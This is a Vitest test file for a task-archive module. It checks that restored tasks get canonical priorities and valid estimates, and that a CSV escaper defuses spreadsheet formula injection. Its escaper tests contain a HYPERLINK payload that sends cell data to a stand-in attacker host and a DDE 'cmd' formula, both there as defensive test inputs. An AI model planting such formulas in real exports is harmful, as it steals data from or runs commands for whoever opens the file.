import { describe, it, expect } from 'vitest';
import { buildRestoredTaskPayload, escapeCSV } from './TaskHistory';

// Two pure helpers of the archive surface, both locking a rule the UI cannot show:
//
//  * buildRestoredTaskPayload — writing a restored task to /tasks is a CREATE, and the live
//    ruleset validates `priority` against the four canonical keys OUTSIDE the role branches
//    (so admins are not exempt). Production archived rows carry legacy values ("Urgent", the
//    retired "VERY_LOW"), which is why "Grąžinti" used to fail with permission-denied on every
//    such row. The payload must therefore leave the collection with a canonical shape.
//
//  * escapeCSV — the exported timesheet is opened by the manager/founder, the account with the
//    widest access. A leading = + - @ makes Excel/LibreOffice treat a worker-authored task title
//    as a FORMULA, so the escaper has to defuse it, not just quote separators.

describe('buildRestoredTaskPayload', () => {
    it('canonicalizes a legacy mixed-case priority the create rule would reject', () => {
        const payload = buildRestoredTaskPayload({ id: 't1', title: 'Legacy', priority: 'Urgent' });
        expect(payload.priority).toBe('URGENT');
    });

    it('maps the retired VERY_LOW priority onto a currently valid tier', () => {
        const payload = buildRestoredTaskPayload({ id: 't2', priority: 'VERY_LOW' });
        expect(['URGENT', 'HIGH', 'MEDIUM', 'LOW']).toContain(payload.priority);
    });

    it('always emits one of the four accepted priorities, even with none stored', () => {
        expect(['URGENT', 'HIGH', 'MEDIUM', 'LOW']).toContain(buildRestoredTaskPayload({ id: 't3' }).priority);
    });

    it('coerces a string-typed estimate to the number the rule requires', () => {
        const payload = buildRestoredTaskPayload({ id: 't4', estimatedTimeMinutes: '90' });
        expect(payload.estimatedTimeMinutes).toBe(90);
    });

    it('drops an estimate outside the accepted range rather than guessing a duration', () => {
        expect('estimatedTimeMinutes' in buildRestoredTaskPayload({ id: 't5', estimatedTimeMinutes: 999999 })).toBe(false);
        expect('estimatedTimeMinutes' in buildRestoredTaskPayload({ id: 't6', estimatedTimeMinutes: 'labas' })).toBe(false);
    });

    it('keeps a valid numeric estimate untouched', () => {
        expect(buildRestoredTaskPayload({ id: 't7', estimatedTimeMinutes: 120 }).estimatedTimeMinutes).toBe(120);
    });

    it('re-arms the task as active work and clears the archival/approval stamps', () => {
        const payload = buildRestoredTaskPayload({
            id: 't8',
            priority: 'HIGH',
            status: 'confirmed',
            completed: true,
            completedAt: '2026-07-01T10:00:00.000Z',
            confirmedBy: 'mgr1',
            archivedAt: '2026-07-02T01:00:00.000Z',
            isDeleted: true,
            teamManagerIds: ['mgr1'],
        });
        expect(payload.status).toBe('in-progress');
        expect(payload.timerStatus).toBe('paused');
        expect(payload.completed).toBe(false);
        expect(payload.completedAt).toBeNull();
        expect(payload.confirmedBy).toBeNull();
        expect(payload.archivedAt).toBeNull();
        expect(payload.isDeleted).toBe(false);
        // The denormalized oversight key must survive verbatim — the rules pin it immutable.
        expect(payload.teamManagerIds).toEqual(['mgr1']);
    });
});

describe('escapeCSV', () => {
    it('defuses a HYPERLINK exfiltration payload in a task title', () => {
        const title = '=HYPERLINK("https://attacker.example/?d="&A2&B2,"Atidaryti")';
        const cell = escapeCSV(title);
        expect(cell.startsWith('=')).toBe(false);
        // Quoted, apostrophe-prefixed, and the payload's own quotes CSV-doubled.
        expect(cell).toBe(`"'${title.replace(/"/g, '""')}"`);
    });

    it('defuses every formula-trigger prefix Excel recognises', () => {
        for (const value of ['=cmd|\'/c calc\'!A0', '+1+1', '-1+1', '@SUM(A1)', '\tlabas', '\rlabas']) {
            expect(escapeCSV(value).startsWith(value[0])).toBe(false);
        }
    });

    it('still quotes separators, quotes and newlines', () => {
        expect(escapeCSV('a,b')).toBe('"a,b"');
        expect(escapeCSV('say "hi"')).toBe('"say ""hi"""');
        expect(escapeCSV('line1\nline2')).toBe('"line1\nline2"');
    });

    it('escapes embedded quotes in a defused formula cell too', () => {
        expect(escapeCSV('="a"')).toBe('"\'=""a"""');
    });

    it('leaves an ordinary value untouched', () => {
        expect(escapeCSV('Stogo remontas')).toBe('Stogo remontas');
        expect(escapeCSV(null)).toBe('""');
        expect(escapeCSV(undefined)).toBe('""');
    });
});
